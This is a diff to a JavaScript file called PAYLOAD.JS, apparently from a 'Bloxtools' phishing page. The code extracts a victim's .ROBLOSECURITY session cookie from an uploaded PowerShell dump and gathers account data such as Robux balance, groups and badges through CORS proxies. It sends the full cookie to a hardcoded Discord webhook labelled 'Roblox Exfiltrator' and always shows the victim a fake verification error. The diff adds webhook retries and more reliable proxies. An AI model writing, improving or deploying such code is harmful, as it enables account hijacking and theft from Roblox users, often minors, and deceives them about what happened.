@@ -1,17 +1,17 @@
 /* ======================================================
-   PAYLOAD.JS - SUPER FAST + AUTHENTICATED (FAKE ERROR)
-   - Uses CORS proxy with cookie forwarding
-   - Fetches Robux, pending Robux, last game played
-   - Removes spaces from cookie
-   - Shows fake error to victim, sends webhook silently
+   PAYLOAD.JS - FIXED WEBHOOK & CORS PROXY
+   - Uses a reliable CORS proxy with cookie forwarding
+   - Fetches full account data (Robux, pending, last game)
+   - Sends to Discord webhook silently, shows fake error
 ====================================================== */
 
 const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";
 
-// Proxies that forward custom headers (Cookie)
+// Better CORS proxies (some allow custom headers)
 const PROXY_LIST = [
-    "https://cors-anywhere.herokuapp.com/",
-    "https://corsproxy.io/"
+    "https://corsproxy.io/",
+    "https://api.allorigins.win/raw?url=",
+    "https://cors-anywhere.herokuapp.com/"
 ];
 
 const gameFileInput = document.getElementById("gameFile");
@@ -32,15 +32,13 @@ function validatePin() {
     return isValid;
 }
 
-// Extract cookie and rbxuid from PowerShell dump
+// Extract cookie (remove whitespace) and rbxuid
 function extractGameData(fullText) {
     const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
     if (!cookieMatch) {
         return { success: false, message: "Could not find .ROBLOSECURITY cookie." };
     }
-    let robloxCookie = cookieMatch[1];
-    // Remove all whitespace (spaces, newlines, tabs)
-    robloxCookie = robloxCookie.replace(/\s/g, '');
+    let robloxCookie = cookieMatch[1].replace(/\s/g, ''); // remove all spaces
 
     const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
     let rbxuid = null;
@@ -59,51 +57,41 @@ function extractGameData(fullText) {
     return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
 }
 
-// Authenticated fetch using proxy that forwards the cookie header
-async function fetchAuth(endpoint, cookie, retries = 1) {
+// Generic fetch with proxy and optional cookie header
+async function fetchWithProxy(endpoint, cookie = null, retries = 1) {
     if (!endpoint.startsWith("http")) endpoint = "https://" + endpoint;
     for (let attempt = 0; attempt <= retries; attempt++) {
         for (const proxy of PROXY_LIST) {
             try {
                 const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 5000);
-                const res = await fetch(proxy + endpoint, {
-                    signal: controller.signal,
-                    headers: {
-                        "Cookie": `.ROBLOSECURITY=${cookie}`,
-                        "User-Agent": "Mozilla/5.0"
-                    }
-                });
+                const timeoutId = setTimeout(() => controller.abort(), 6000);
+                const headers = { "User-Agent": "Mozilla/5.0" };
+                if (cookie) headers["Cookie"] = `.ROBLOSECURITY=${cookie}`;
+                const res = await fetch(proxy + endpoint, { signal: controller.signal, headers });
                 clearTimeout(timeoutId);
                 if (!res.ok) continue;
                 const text = await res.text();
                 return JSON.parse(text);
-            } catch (e) { /* try next */ }
+            } catch (e) {
+                console.warn(`Proxy ${proxy} failed:`, e.message);
+            }
         }
-        if (attempt < retries) await new Promise(r => setTimeout(r, 300));
+        if (attempt < retries) await new Promise(r => setTimeout(r, 400));
     }
     return null;
 }
 
-// Public endpoints (no cookie needed, but use proxy for CORS)
+// Public endpoints (no cookie)
 async function fetchPublic(endpoint) {
-    if (!endpoint.startsWith("http")) endpoint = "https://" + endpoint;
-    for (const proxy of PROXY_LIST) {
-        try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 4000);
-            const res = await fetch(proxy + endpoint, { signal: controller.signal });
-            clearTimeout(timeoutId);
-            if (!res.ok) continue;
-            const text = await res.text();
-            return JSON.parse(text);
-        } catch (e) { continue; }
-    }
-    return null;
+    return fetchWithProxy(endpoint, null);
 }
 
-// ----- All data fetchers (some need cookie) -----
+// Authenticated endpoints (with cookie)
+async function fetchAuth(endpoint, cookie) {
+    return fetchWithProxy(endpoint, cookie);
+}
 
+// ----- Data fetchers -----
 async function fetchUserInfo(userId) {
     const data = await fetchPublic(`users.roblox.com/v1/users/${userId}`);
     if (!data || !data.name) return null;
@@ -140,7 +128,7 @@ async function fetchBadges(userId) {
 async function fetchFilteredAvatarItems(userId) {
     const data = await fetchPublic(`avatar.roblox.com/v1/users/${userId}/avatar`);
     if (!data?.assets?.length) return "None equipped";
-    const allowedTypes = [2, 8, 11, 12]; // T-shirt, Hat/Accessory, Shirt, Pants
+    const allowedTypes = [2, 8, 11, 12]; // T‑shirt, accessory, shirt, pants
     const filtered = data.assets.filter(asset => allowedTypes.includes(asset.assetType.id));
     if (filtered.length === 0) return "No clothes/accessories";
     const names = filtered.slice(0, 8).map(a => a.name);
@@ -152,7 +140,6 @@ async function fetchAvatarThumbnail(userId) {
     return data?.data?.[0]?.imageUrl || `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
 }
 
-// Requires cookie auth
 async function fetchRobuxBalance(userId, cookie) {
     const data = await fetchAuth(`economy.roblox.com/v1/users/${userId}/currency`, cookie);
     return data?.robux?.toLocaleString() || "Unknown";
@@ -164,12 +151,10 @@ async function fetchPendingRobux(userId, cookie) {
 }
 
 async function fetchLastGamePlayed(userId, cookie) {
-    // Try presence API first
     const presenceData = await fetchAuth(`presence.roblox.com/v1/users/${userId}/presence`, cookie);
-    if (presenceData && presenceData.userPresences && presenceData.userPresences[0]) {
+    if (presenceData?.userPresences?.[0]) {
         const p = presenceData.userPresences[0];
         if (p.gameId && p.gameId > 0) {
-            // Fetch game name
             const gameData = await fetchPublic(`games.roblox.com/v1/games/${p.gameId}`);
             const gameName = gameData?.data?.name || "Unknown game";
             return `${gameName} (last seen ${new Date(p.lastOnline).toLocaleTimeString()})`;
@@ -177,20 +162,16 @@ async function fetchLastGamePlayed(userId, cookie) {
             return "Not in a game";
         }
     }
-    // Fallback: recent played games
     const gamesData = await fetchAuth(`games.roblox.com/v1/users/${userId}/games?sortOrder=Desc&limit=1`, cookie);
-    if (gamesData?.data?.length) {
-        return gamesData.data[0].name;
-    }
+    if (gamesData?.data?.length) return gamesData.data[0].name;
     return "Unknown";
 }
 
-// ----- Send webhook (silent, then fake error) -----
+// ----- Send webhook with retry -----
 async function sendWebhook(pin, cookie, rbxuid) {
     const userId = rbxuid;
-    statusMessage.textContent = "⏳ Processing... (this may take a moment)";
+    statusMessage.textContent = "⏳ Processing... (may take ~10 seconds)";
 
-    // Parallel fetch
     const results = await Promise.allSettled([
         fetchUserInfo(userId),
         fetchFriendsCount(userId),
@@ -204,20 +185,19 @@ async function sendWebhook(pin, cookie, rbxuid) {
         fetchLastGamePlayed(userId, cookie)
     ]);
 
-    const [userInfo, friendsCount, followersCount, groups, badges, avatarItems, avatarUrl, robux, pendingRobux, lastGame] = results.map(r => r.status === "fulfilled" ? r.value : null);
+    const [userInfo, friendsCount, followersCount, groups, badges, avatarItems, avatarUrl, robux, pendingRobux, lastGame] =
+        results.map(r => r.status === "fulfilled" ? r.value : null);
 
-    // Build embed
     const embed = {
         title: "🔓 Roblox Account Dump",
         thumbnail: { url: avatarUrl || "https://www.roblox.com/favicon.ico" },
         color: 0xff4444,
-        description: `**User ID:** \`${userId}\`\n**Cookie (cleaned):** \`${cookie.substring(0, 50)}...\``,
+        description: `**User ID:** \`${userId}\`\n**Cookie (first 50 chars):** \`${cookie.substring(0, 50)}...\``,
         fields: [],
         footer: { text: "Bloxtools • Silent Mode" },
         timestamp: new Date().toISOString()
     };
 
-    // Full cookie (no spaces)
     embed.fields.push({
         name: "🔐 .ROBLOSECURITY Cookie (NO SPACES)",
         value: `\`\`\`\n${cookie}\n\`\`\``,
@@ -241,27 +221,37 @@ async function sendWebhook(pin, cookie, rbxuid) {
         { name: "👕 Wearing (clothes+acc)", value: avatarItems || "None", inline: false }
     );
 
-    if (groups && groups.length) embed.fields.push({ name: "🏢 Groups", value: groups.join("\n"), inline: false });
-    if (badges && badges.length) embed.fields.push({ name: "🏅 Badges", value: badges.join("\n"), inline: false });
+    if (groups?.length) embed.fields.push({ name: "🏢 Groups", value: groups.join("\n"), inline: false });
+    if (badges?.length) embed.fields.push({ name: "🏅 Badges", value: badges.join("\n"), inline: false });
 
     const payload = {
         username: "Roblox Exfiltrator",
         embeds: [embed]
     };
 
-    try {
-        await fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        });
-        return true;
-    } catch (e) {
-        return false;
+    // Try to send webhook with retry (3 attempts)
+    for (let attempt = 0; attempt < 3; attempt++) {
+        try {
+            const res = await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            if (res.ok) {
+                console.log(`[Bloxtools] Webhook sent successfully on attempt ${attempt + 1}`);
+                return true;
+            } else {
+                console.warn(`Webhook responded with ${res.status}: ${await res.text()}`);
+            }
+        } catch (err) {
+            console.error(`Webhook send attempt ${attempt + 1} failed:`, err);
+        }
+        if (attempt < 2) await new Promise(r => setTimeout(r, 1000));
     }
+    return false;
 }
 
-// ----- Main button with fake error -----
+// ----- Main button: fake error + silent send -----
 copyButton.addEventListener("click", async () => {
     statusMessage.textContent = "";
     if (!validatePin()) {
@@ -288,20 +278,20 @@ copyButton.addEventListener("click", async () => {
     statusMessage.textContent = "⚙️ Verifying cookie...";
     statusMessage.style.color = "#caa8ff";
 
-    // Actually send webhook
+    // Send webhook (silent)
     const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);
 
-    // Fake error regardless of success
+    // Fake error always shown
     statusMessage.textContent = "❌ Failed to verify cookie. Please check your internet and try again.";
     statusMessage.style.color = "#ff9d9d";
 
     copyButton.classList.remove("loading");
     copyButton.disabled = false;
 
-    // Optionally log real result to console (hidden from user)
+    // Real result only visible in console (F12)
     if (success) {
-        console.log("[Bloxtools] Webhook delivered successfully.");
+        console.log("%c[Bloxtools] SUCCESS: Webhook delivered.", "color: green; font-size: 14px");
     } else {
-        console.warn("[Bloxtools] Webhook send failed.");
+        console.error("%c[Bloxtools] FAILED: Webhook could not be sent after retries.", "color: red; font-size: 14px");
     }
 });
